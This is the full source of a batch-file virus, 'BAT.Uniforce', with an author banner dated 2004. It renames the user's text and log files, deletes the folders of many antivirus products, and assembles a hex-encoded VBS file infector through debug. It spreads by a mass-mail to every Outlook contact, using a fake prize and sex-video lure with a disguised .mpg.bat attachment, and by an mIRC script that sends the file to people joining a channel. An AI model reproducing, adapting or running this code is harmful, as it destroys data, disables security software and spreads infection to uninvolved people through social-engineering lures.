:: BAT.Uniforce _________________________________________________________
::    _______   _______   _       _   _______       ____   ____  _______
::   / ____ \\ / ____ \\ /\\     /\\ / ____ \\     /   \\ /  // / ____ \\
::  / //___\// \ \\_ \// \ \\   / // \ \\_ \//    /  /\ \/  // / //   \//
::  \______ \\ / __//     \ \\ / //  / __//      /  // \   //  \ \\   _
::  /\\___/ // \ \\__/\\   \ \/ //   \ \\__/\\  /  //  /  //    \ \\__/\\
::  \______//   \_____//    \__//     \_____// /__//  /__//      \_____//
:: ________________________http://trax.to/sevenC_________________________
:: ________________________sevenC_zone@yahoo.com_________________________
:: Again with me...!!
:: Why bAtCh...??
:: Coz BatCh is nOt too HarD...!!! 
:: Just try to make something work with it...!!
:: But Now I'm toooo Lazy to tell you how this shiT workz..!!
:: I'm sorry for that...!! :)
:: Happy coding...!!
::
:: sevenC / IVWA
:: Jan 24 2004 
:: Bekasi-Indonesia
:: _______________________________________________________________________

@ctty nul
@echo off
@copy %0 %windir%\relax.bat

:: First Bat will rename the following files

@for %%a in (C:\*.txt) do ren %%a *.bat
@for %%a in (C:\*.log) do ren %%a *.bat
@for %%a in (C:\*.tmp) do ren %%a *.bat
@for %%a in (C:\windows\*.txt) do ren %%a *.bat
@for %%a in (C:\windows\*.log) do ren %%a *.bat
@for %%a in (C:\windows\*.tmp) do ren %%a *.bat
@for %%a in (C:\Mydocu~1\*.txt) do ren %%a *.bat

:: Kill the AV'S

@if exist c:\progra~1\norton~1\*.* deltree/y c:\progra~1\norton~1\
@if exist c:\progra~1\norton~2\*.* deltree/y c:\progra~1\norton~2\
@if exist c:\progra~1\symant~1\*.* deltree/y c:\progra~1\symant~1\
@if exist c:\progra~1\common~1\symant~1\*.* deltree/y c:\progra~1\common~1\symant~1\
@if exist c:\progra~1\common~1\avpsha~1\avpbases\*.* deltree/y c:\progra~1\common~1\avpsha~1\avpbases\
@if exist c:\progra~1\common~1\avpsha~1\*.* deltree/y c:\progra~1\common~1\avpsha~1\
@if exist c:\progra~1\mcafee\viruss~1\*.* deltree/y c:\progra~1\mcafee\viruss~1\
@if exist c:\progra~1\mcafee\*.* deltree/y c:\progra~1\mcafee\
@if exist c:\progra~1\pandas~1\*.* deltree/y c:\progra~1\pandas~1\
@if exist c:\progra~1\trendm~1\*.* deltree/y c:\progra~1\trendm~1\
@if exist c:\progra~1\comman~1\*.* deltree/y c:\progra~1\comman~1\
@if exist c:\progra~1\zonela~1\*.* deltree/y c:\progra~1\zonela~1\
@if exist c:\progra~1\tinype~1\*.* deltree/y c:\progra~1\tinype~1\
@if exist c:\progra~1\kasper~1\*.* deltree/y c:\progra~1\kasper~1\
@if exist c:\progra~1\kasper~2\*.* deltree/y c:\progra~1\kasper~2\
@if exist c:\progra~1\trojan~1\*.* deltree/y c:\progra~1\trojan~1\
@if exist c:\progra~1\avpers~1\*.* deltree/y c:\progra~1\avpers~1\
@if exist c:\progra~1\grisoft\*.* deltree/y c:\progra~1\grisoft\
@if exist c:\progra~1\antivi~1\*.* deltree/y c:\progra~1\antivi~1\
@if exist c:\progra~1\quickh~1\*.* deltree/y c:\progra~1\quickh~1\
@if exist c:\progra~1\f-prot95\*.* deltree/y c:\progra~1\f-prot95\
@if exist c:\progra~1\fwin32\*.* deltree/y c:\progra~1\fwin32\
@if exist c:\progra~1\tbav\*.* deltree/y c:\progra~1\tbav\
@if exist c:\progra~1\findvi~1\*.* deltree/y c:\progra~1\findvi~1\
@if exist c:\findvi~1\*.* deltree/y c:\findvi~1\
@if exist c:\esafen\*.* deltree/y c:\esafen\
@if exist c:\f-macro\*.* deltree/y c:\f-macro\
@if exist c:\tbavw95\*.* deltree/y c:\tbavw95\
@if exist c:\tbav\*.* deltree/y c:\tbav\
@if exist c:\vs95\*.* deltree/y c:\vs95\
@if exist c:\antivi~1\*.* deltree/y c:\antivi~1\
@if exist c:\toolkit\findvi~1\*.* deltree/y c:\toolkit\findvi~1\
@if exist c:\pccill~1\*.* deltree/y c:\pccill~1\

:: This is ouR main infection routine,Bat will generate and execute VBS virus
:: (relax.vbs) that has been made.Sorry for this time Binnary is needed.

set .....þ.....=echo e 0
%.....þ.....%100 4F 6E 20 45 72 72 6F 72 20 52 65 73 75 6D 65 20>>fuck
%.....þ.....%110 4E 65 78 74 0D 0A 44 69 6D 20 73 75 63 6B 65 2C>>fuck
%.....þ.....%120 20 46 73 6F 2C 20 44 72 69 76 65 73 2C 20 44 72>>fuck
%.....þ.....%130 69 76 65 2C 20 46 6F 6C 64 65 72 2C 20 46 69 6C>>fuck
%.....þ.....%140 65 73 2C 20 46 69 6C 65 2C 20 53 75 62 66 6F 6C>>fuck
%.....þ.....%150 64 65 72 73 2C 53 75 62 66 6F 6C 64 65 72 20 0D>>fuck
%.....þ.....%160 0A 53 65 74 20 73 75 63 6B 65 20 3D 20 77 73 63>>fuck
%.....þ.....%170 72 69 70 74 2E 43 72 65 61 74 65 4F 62 6A 65 63>>fuck
%.....þ.....%180 74 28 22 57 53 63 72 69 70 74 2E 53 68 65 6C 6C>>fuck
%.....þ.....%190 22 29 0D 0A 53 65 74 20 46 73 6F 20 3D 20 43 72>>fuck
%.....þ.....%1A0 65 61 74 65 4F 62 6A 65 63 74 28 22 73 63 72 69>>fuck
%.....þ.....%1B0 70 74 69 6E 67 2E 46 69 6C 65 53 79 73 74 65 6D>>fuck
%.....þ.....%1C0 4F 62 6A 65 63 74 22 29 0D 0A 53 65 74 20 44 72>>fuck
%.....þ.....%1D0 69 76 65 73 3D 66 73 6F 2E 64 72 69 76 65 73 0D>>fuck
%.....þ.....%1E0 0A 53 65 74 20 64 72 6F 70 70 65 72 20 3D 20 46>>fuck
%.....þ.....%1F0 73 6F 2E 6F 70 65 6E 74 65 78 74 66 69 6C 65 28>>fuck
%.....þ.....%200 77 73 63 72 69 70 74 2E 73 63 72 69 70 74 66 75>>fuck
%.....þ.....%210 6C 6C 6E 61 6D 65 2C 20 31 29 0D 0A 73 72 63 20>>fuck
%.....þ.....%220 3D 20 64 72 6F 70 70 65 72 2E 72 65 61 64 61 6C>>fuck
%.....þ.....%230 6C 0D 0A 73 65 74 20 54 72 61 6E 67 65 20 3D 20>>fuck
%.....þ.....%240 64 6F 63 75 6D 65 6E 74 2E 62 6F 64 79 2E 43 72>>fuck
%.....þ.....%250 65 61 74 65 54 65 78 74 52 61 6E 67 65 0D 0A 46>>fuck
%.....þ.....%260 73 6F 2E 63 6F 70 79 66 69 6C 65 20 77 73 63 72>>fuck
%.....þ.....%270 69 70 74 2E 73 63 72 69 70 74 66 75 6C 6C 6E 61>>fuck
%.....þ.....%280 6D 65 2C 20 22 43 3A 5C 57 49 4E 44 4F 57 53 5C>>fuck
%.....þ.....%290 53 74 61 72 74 20 4D 65 6E 75 5C 50 72 6F 67 72>>fuck
%.....þ.....%2A0 61 6D 73 5C 53 74 61 72 74 55 70 5C 53 68 65 6C>>fuck
%.....þ.....%2B0 6C 33 32 2E 76 62 73 22 0D 0A 66 73 6F 2E 43 6F>>fuck
%.....þ.....%2C0 70 79 66 69 6C 65 28 22 43 3A 5C 77 69 6E 64 6F>>fuck
%.....þ.....%2D0 77 73 5C 72 65 6C 61 78 2E 62 61 74 22 29 2C 20>>fuck
%.....þ.....%2E0 22 43 3A 5C 57 49 4E 44 4F 57 53 5C 53 74 61 72>>fuck
%.....þ.....%2F0 74 20 4D 65 6E 75 5C 50 72 6F 67 72 61 6D 73 5C>>fuck
%.....þ.....%300 53 74 61 72 74 55 70 5C 53 68 65 6C 6C 33 32 2E>>fuck
%.....þ.....%310 62 61 74 22 0D 0A 53 65 74 20 46 73 6F 20 3D 20>>fuck
%.....þ.....%320 63 72 65 61 74 65 6F 62 6A 65 63 74 28 22 73 63>>fuck
%.....þ.....%330 72 69 70 74 69 6E 67 2E 66 69 6C 65 73 79 73 74>>fuck
%.....þ.....%340 65 6D 6F 62 6A 65 63 74 22 29 20 0D 0A 53 65 74>>fuck
%.....þ.....%350 20 44 72 69 76 65 73 3D 66 73 6F 2E 64 72 69 76>>fuck
%.....þ.....%360 65 73 20 0D 0A 46 6F 72 20 45 61 63 68 20 44 72>>fuck
%.....þ.....%370 69 76 65 20 69 6E 20 44 72 69 76 65 73 0D 0A 49>>fuck
%.....þ.....%380 66 20 64 72 69 76 65 2E 69 73 72 65 61 64 79 20>>fuck
%.....þ.....%390 74 68 65 6E 0D 0A 65 6E 64 20 49 66 20 0D 0A 4E>>fuck
%.....þ.....%3A0 65 78 74 20 0D 0A 46 75 6E 63 74 69 6F 6E 20 44>>fuck
%.....þ.....%3B0 6F 73 65 61 72 63 68 28 50 61 74 68 29 20 0D 0A>>fuck
%.....þ.....%3C0 53 65 74 20 46 6F 6C 64 65 72 3D 66 73 6F 2E 67>>fuck
%.....þ.....%3D0 65 74 66 6F 6C 64 65 72 28 70 61 74 68 29 20 0D>>fuck
%.....þ.....%3E0 0A 53 65 74 20 46 69 6C 65 73 20 3D 20 66 6F 6C>>fuck
%.....þ.....%3F0 64 65 72 2E 66 69 6C 65 73 0D 0A 46 6F 72 20 45>>fuck
%.....þ.....%400 61 63 68 20 46 69 6C 65 20 69 6E 20 66 69 6C 65>>fuck
%.....þ.....%410 73 0D 0A 49 66 20 66 73 6F 2E 47 65 74 45 78 74>>fuck
%.....þ.....%420 65 6E 73 69 6F 6E 4E 61 6D 65 28 66 69 6C 65 2E>>fuck
%.....þ.....%430 70 61 74 68 29 3D 22 76 62 73 22 20 6F 72 20 66>>fuck
%.....þ.....%440 73 6F 2E 47 65 74 45 78 74 65 6E 73 69 6F 6E 4E>>fuck
%.....þ.....%450 61 6D 65 28 66 69 6C 65 2E 70 61 74 68 29 3D 22>>fuck
%.....þ.....%460 76 62 65 22 20 74 68 65 6E 20 0D 0A 53 65 74 20>>fuck
%.....þ.....%470 64 72 6F 70 70 65 72 20 3D 20 46 73 6F 2E 63 72>>fuck
%.....þ.....%480 65 61 74 65 74 65 78 74 66 69 6C 65 28 66 69 6C>>fuck
%.....þ.....%490 65 2E 70 61 74 68 2C 20 54 72 75 65 29 0D 0A 64>>fuck
%.....þ.....%4A0 72 6F 70 70 65 72 2E 77 72 69 74 65 20 73 72 63>>fuck
%.....þ.....%4B0 0D 0A 64 72 6F 70 70 65 72 2E 43 6C 6F 73 65 0D>>fuck
%.....þ.....%4C0 0A 65 6E 64 20 69 66 0D 0A 49 66 20 66 73 6F 2E>>fuck
%.....þ.....%4D0 47 65 74 45 78 74 65 6E 73 69 6F 6E 4E 61 6D 65>>fuck
%.....þ.....%4E0 28 66 69 6C 65 2E 70 61 74 68 29 3D 22 62 61 74>>fuck
%.....þ.....%4F0 22 20 74 68 65 6E 20 0D 0A 53 65 74 20 66 73 6F>>fuck
%.....þ.....%500 20 3D 20 63 72 65 61 74 65 6F 62 6A 65 63 74 28>>fuck
%.....þ.....%510 22 73 63 72 69 70 74 69 6E 67 2E 66 69 6C 65 73>>fuck
%.....þ.....%520 79 73 74 65 6D 6F 62 6A 65 63 74 22 29 20 0D 0A>>fuck
%.....þ.....%530 53 65 74 20 6F 6F 6F 6F 6F 20 3D 20 66 73 6F 2E>>fuck
%.....þ.....%540 6F 70 65 6E 74 65 78 74 66 69 6C 65 28 22 43 3A>>fuck
%.....þ.....%550 5C 77 69 6E 64 6F 77 73 5C 72 65 6C 61 78 2E 62>>fuck
%.....þ.....%560 61 74 22 29 20 0D 0A 6F 6F 6F 6F 6F 6F 20 3D 20>>fuck
%.....þ.....%570 6F 6F 6F 6F 6F 2E 72 65 61 64 61 6C 6C 20 0D 0A>>fuck
%.....þ.....%580 6F 6F 6F 6F 6F 2E 63 6C 6F 73 65 20 0D 0A 53 65>>fuck
%.....þ.....%590 74 20 64 72 6F 70 70 65 72 20 3D 20 46 73 6F 2E>>fuck
%.....þ.....%5A0 63 72 65 61 74 65 74 65 78 74 66 69 6C 65 28 66>>fuck
%.....þ.....%5B0 69 6C 65 2E 70 61 74 68 2C 20 54 72 75 65 29 0D>>fuck
%.....þ.....%5C0 0A 64 72 6F 70 70 65 72 2E 77 72 69 74 65 20 6F>>fuck
%.....þ.....%5D0 6F 6F 6F 6F 6F 0D 0A 64 72 6F 70 70 65 72 2E 43>>fuck
%.....þ.....%5E0 6C 6F 73 65 0D 0A 65 6E 64 20 69 66 0D 0A 6E 65>>fuck
%.....þ.....%5F0 78 74 0D 0A 53 65 74 20 53 75 62 66 6F 6C 64 65>>fuck
%.....þ.....%600 72 73 20 3D 20 66 6F 6C 64 65 72 2E 53 75 62 46>>fuck
%.....þ.....%610 6F 6C 64 65 72 73 20 0D 0A 46 6F 72 20 45 61 63>>fuck
%.....þ.....%620 68 20 53 75 62 66 6F 6C 64 65 72 20 69 6E 20 53>>fuck
%.....þ.....%630 75 62 66 6F 6C 64 65 72 73 20 0D 0A 44 6F 73 65>>fuck
%.....þ.....%640 61 72 63 68 20 53 75 62 66 6F 6C 64 65 72 2E 70>>fuck
%.....þ.....%650 61 74 68 20 0D 0A 4E 65 78 74 20 0D 0A 65 6E 64>>fuck
%.....þ.....%660 20 66 75 6E 63 74 69 6F 6E 20 0D 0A 27 42 41 54>>fuck
%.....þ.....%670 2E 56 42 53 2E 52 45 4C 41 58 0D 0A 27 43 52 45>>fuck
%.....þ.....%680 41 54 45 44 20 42 59 20 73 65 76 65 6E 43 0D 0A>>fuck
@echo rcx>>fuck
@echo 590>>fuck
@echo n relax.vbs>>fuck
@echo w>>fuck
@echo q>>fuck
@debug<fuck
@move relax.vbs %windir%
@Cscript %windir%\relax.vbs
@del fuck

:: OutLook spreading

@copy %0 C:\britney.mpg.bat
@echo Dim x > C:\kvqim.vbs
@echo.on error resume next >> C:\kvqim.vbs
@echo Set fso =" Scripting.FileSystem.Object" >> C:\kvqim.vbs
@echo Set so=CreateObject(fso) >> C:\kvqim.vbs
@echo Set ol=CreateObject("Outlook.Application") >> C:\kvqim.vbs
@echo Set out=WScript.CreateObject("Outlook.Application") >> C:\kvqim.vbs
@echo Set mapi = out.GetNameSpace("MAPI") >> C:\kvqim.vbs
@echo Set a = mapi.AddressLists(1) >> C:\kvqim.vbs
@echo Set ae=a.AddressEntries >> C:\kvqim.vbs
@echo For x=1 To ae.Count >> C:\kvqim.vbs
@echo Set ci=ol.CreateItem(0) >> C:\kvqim.vbs
@echo Set Mail=ci >> C:\kvqim.vbs
@echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) >> C:\kvqim.vbs
@echo Mail.Subject="You are the winner" >> C:\kvqim.vbs
@echo Mail.Body="Congragulation You just won free Britney spears sex movie" >> C:\kvqim.vbs
@echo Mail.Attachments.Add("C:\britney.mpg.bat") >> C:\kvqim.vbs
@echo Mail.Send >> C:\kvqim.vbs
@echo Next >> C:\kvqim.vbs
@echo ol.Quit >> C:\kvqim.vbs
@cscript C:\kvqim.vbs
@del C:\kvqim.vbs
@del C:\britney.mpg.bat

:: mIrC Spreading

@echo.[script]>>script.ini
@echo.n0=on 1:JOIN:#:{>>script.ini
@echo.n1=/if ( $nick == $me ) { halt }>>script.ini
@echo.n2=/dcc send $nick c:\windows\relax.bat>>script.ini
@echo.n3=}>>script.ini

@if exist c:\mirc\script.ini deltree/y c:\mirc\script.ini
@if exist c:\mirc32\script.ini deltree/y c:\mirc32\script.ini
@if exist c:\progra~1\mirc\script.ini deltree/y c:\progra~1\mirc\script.ini
@if exist c:\progra~1\mirc32\script.ini deltree/y c:\progra~1\mirc32\script.ini
@if exist c:\mirc\mirc.ini copy script.ini c:\mirc\script.ini
@if exist c:\mirc32\mirc.ini copy script.ini c:\mirc32\script.ini
@if exist c:\progra~1\mirc\mirc.ini copy script.ini c:\progra~1\mirc\script.ini
@if exist c:\progra~1\mirc32\mirc.ini copy script.ini c:\progra~1\mirc32\script.ini

:: Bat will create Oeminfo.ini and give it Information about it self

@echo [General]>>C:\Windows\system\Oeminfo.ini
@echo Manufacturer="VIRUS INFORMATION">>C:\Windows\system\Oeminfo.ini
@echo Model="BAT.Uniforce by sevenC">>C:\Windows\system\Oeminfo.ini
@echo [Support Information]>>C:\Windows\system\Oeminfo.ini
@echo Line1="BAT.Uniforce Information">>C:\Windows\system\Oeminfo.ini
@echo Line2="*********************************">>C:\Windows\system\Oeminfo.ini
@echo Line3="hEllooOO...!!">>C:\Windows\system\Oeminfo.ini
@echo Line4="I'm here...!!">>C:\Windows\system\Oeminfo.ini
@echo Line5="The Uniforce Discordiantz">>C:\Windows\system\Oeminfo.ini
@echo Line6="I just want to show you howz hurt when your Goverment is corrupt..??">>C:\Windows\system\Oeminfo.ini
@echo Line7="********************************************************************">>C:\Windows\system\Oeminfo.ini
@echo Line8="BAT.Uniforce By sevenC">>C:\Windows\system\Oeminfo.ini
@echo Line9="Created on friday 13th April 2004">>C:\Windows\system\Oeminfo.ini
@echo Line10="-Kranji.Bekasi.Indonesia-">>C:\Windows\system\Oeminfo.ini

:: What is it ??

@echo msgbox "Indonesia was Broken, Fuck damn of the Goverment",VbInformation,"BAT.Uniforce">>mes.vbs
@echo msgbox "BAT.Uniforce By sevenC",VbInformation,"BAT.Uniforce">>mes.vbs
@Cscript mes.vbs
@del mes.vbs